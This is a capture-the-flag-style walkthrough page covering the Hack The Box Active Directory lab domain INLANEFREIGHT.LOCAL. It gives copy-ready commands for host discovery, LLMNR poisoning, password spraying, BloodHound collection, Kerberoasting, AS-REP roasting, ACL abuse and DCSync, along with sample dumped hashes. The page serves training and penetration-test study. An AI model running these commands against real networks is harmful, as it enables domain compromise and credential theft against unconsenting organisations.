---
layout: default
title: "HTB AD: Full Attack Chain (Recon → Domain Takeover)"
order: 10
phase: "CHAIN"
tactic: "End-to-end"
summary: "The complete HTB 'AD Enumeration & Attacks' kill-chain against INLANEFREIGHT.LOCAL — recon, user enum, spraying, authenticated enum, BloodHound, Kerberoasting/AS-REP/ACL, and domain takeover via DCSync."
---

{% include ad_nav.html %}

# HTB AD — Full Attack Chain

A single, cohesive walkthrough of the **Hack The Box: Active Directory Enumeration & Attacks** methodology, mapped end-to-end against the lab domain **`INLANEFREIGHT.LOCAL`** (DC `172.16.5.5`). Each phase links to the detailed vector modules; the companion [HTB AD Cheatsheet](/AD_metodology/htb-ad-cheatsheet/) holds every command with copy buttons.

<div class="attack-diagram">
  <div class="diag-title">INLANEFREIGHT.LOCAL — domain compromise kill-chain</div>
  <div class="diag-flow">
    <div class="diag-node start"><span class="n-step">P1</span><span class="n-title">Recon</span><span class="n-tool">fping / nmap / responder</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">P2</span><span class="n-title">User enum + spray</span><span class="n-tool">kerbrute / cme</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">P3</span><span class="n-title">Auth enum + BH</span><span class="n-tool">cme / smbmap / bloodhound</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">P4</span><span class="n-title">Exploit</span><span class="n-tool">kerberoast / ACL</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node win"><span class="n-step">P5</span><span class="n-title">Domain takeover</span><span class="n-tool">DCSync / secretsdump</span></div>
  </div>
</div>

## Phase 1 — Recon & Network Enumeration

Goal: from an unauthenticated foothold on the internal network, identify hosts, the DC, DNS and harvest hashes passively.

```bash
# Map domain name <-> IP, sweep the segment, port/version scan the live hosts
nslookup ns1.inlanefreight.com
fping -asgq 172.16.5.0/23
sudo nmap -v -A -iL hosts.txt -oN /home/user/Documents/host-enum
# Passive hash harvesting while you work
sudo tcpdump -i ens224
sudo responder -I ens224 -A
```

<div class="callout info"><span class="callout-title">Interpretation</span>Hosts replying to <code>fping</code> become <code>hosts.txt</code>. In nmap look for <code>88/kerberos</code>, <code>389/ldap</code>, <code>445/smb</code> → that host is a <strong>Domain Controller</strong>. Responder in <code>-A</code> (analyze) mode only observes LLMNR/NBT-NS; drop <code>-A</code> to actively poison and capture NetNTLMv2.</div>

## Phase 2 — User Enumeration, Password Policy & Spraying

Goal: build a valid username list, read the lockout policy, then spray safely. → [Kerbrute module](/AD_metodology/kerbrute-enumeration/)

```bash
# Enumerate valid users via Kerberos pre-auth (no lockouts)
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 /opt/jsmith.txt -o kerb-results
# Read the password policy FIRST (null session or any cred)
rpcclient -U "" -N 172.16.5.5            # then: querydominfo
enum4linux-ng -P 172.16.5.5 -oA ilfreight
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
# Spray ONE password across all users, respecting the lockout window
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

<div class="callout danger"><span class="callout-title">Lockout safety</span>Always read <code>--pass-pol</code> before spraying. One password / all users / one attempt per observation window. A <code>+</code> in CrackMapExec output (or <code>(Pwn3d!)</code>) marks valid credentials.</div>

## Phase 3 — Authenticated Enumeration, SMB Shares & BloodHound

Goal: with the first valid credential, enumerate users/groups/shares and map privilege paths. → [BloodHound module](/AD_metodology/bloodhound-enumeration/)

```bash
# Users / groups / shares with valid creds
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
# Spider SYSVOL / interesting shares
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share
# Collect the full graph
sudo bloodhound-python -u forend -p Klmcargo2 -ns 172.16.5.5 -d inlanefreight.local -c all
```

<div class="callout tip"><span class="callout-title">Interpretation</span>Mark your owned user in BloodHound and run <em>Shortest Path from Owned Principals</em>. Each edge (GenericAll, GenericWrite, AddMember, DCSync…) is a concrete next step documented in the vector modules.</div>

## Phase 4 — Exploitation (Kerberoasting · AS-REP · ACL)

Goal: turn a low-priv credential into higher privilege. → [Kerberoasting](/AD_metodology/kerberoasting/) · [AS-REP](/AD_metodology/asrep-roasting/) · [ACL/DACL](/AD_metodology/acl-dacl-abuse/)

```bash
# Kerberoasting — request all SPN tickets, crack offline
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
# AS-REP Roasting — users without pre-auth
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -usersfile valid_users.txt -format hashcat -no-pass
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```

```powershell
# ACL abuse chain (PowerView): reset a user, add self to a group, create a fake SPN to roast
$SecPassword = ConvertTo-SecureString 'Klmcargo2' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

<div class="callout warning"><span class="callout-title">Interpretation</span>Hashcat modes: <code>13100</code> = Kerberoast TGS (RC4), <code>18200</code> = AS-REP (RC4). After an ACL win, enumerate the new principal's rights again — chains often continue (e.g. <code>wley</code> → <code>damundsen</code> → <code>adunn</code> who holds DCSync rights).</div>

## Phase 5 — Domain Takeover (DCSync · secretsdump · Mimikatz)

Goal: with replication rights (e.g. `adunn`), dump the domain's secrets and own the forest. → [DCSync & Golden Ticket](/AD_metodology/dcsync-golden-ticket/)

```bash
# Confirm the account can replicate, then DCSync all hashes (incl. krbtgt)
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

```powershell
# Or from Windows with Mimikatz
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

```terminal
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
INLANEFREIGHT.LOCAL\administrator:500:aad3b435...:313b6f423cd1ee07e91315b4919fb4ba:::
krbtgt:502:aad3b435...:9d765b482771505cbe97411065964d5f:::
```

<div class="callout danger"><span class="callout-title">Full compromise</span>With the <code>krbtgt</code> hash you can forge a Golden Ticket (<code>ticketer.py</code> / <code>kerberos::golden</code>) for permanent domain control, and with the Enterprise Admins SID in <code>-extra-sid</code> escalate from a child to the parent domain across the forest trust.</div>

## Beyond the core chain (lab extras)

The PDF also covers host-level and trust attacks — all commands are in the [cheatsheet](/AD_metodology/htb-ad-cheatsheet/): **NoPac** (CVE-2021-42278/42287), **PrintNightmare** (CVE-2021-1675), **PetitPotam** (AD CS NTLM relay), **GPP passwords** (`gpp-decrypt`), **MSSQL** abuse (PowerUpSQL / mssqlclient), and **child→parent / cross-forest** golden-ticket escalation.

{% include toc_sidebar.html %}
{% include copy_buttons.html %}
